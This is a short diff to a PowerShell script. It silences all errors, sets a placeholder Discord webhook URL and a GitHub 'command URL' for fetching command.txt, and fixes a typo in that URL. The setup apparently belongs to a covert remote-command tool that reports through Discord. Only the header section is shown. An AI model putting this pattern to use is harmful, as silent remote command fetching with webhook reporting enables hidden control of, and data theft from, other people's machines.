@@ -6,7 +6,7 @@ $ErrorActionPreference = 'SilentlyContinue'
 # Define Discord webhook URL
 $hookUrl = "https://discord.com/api/webhooks/YOUR_DISCORD_HOOK_URL_HERE"
 # Define command URL
-$url = "Yhttps://github.com/YOUR_PATH_TO/command.txt"
+$url = "https://github.com/YOUR_PATH_TO/command.txt"
 ###/HEAD
 
 ###FUNCTIONS
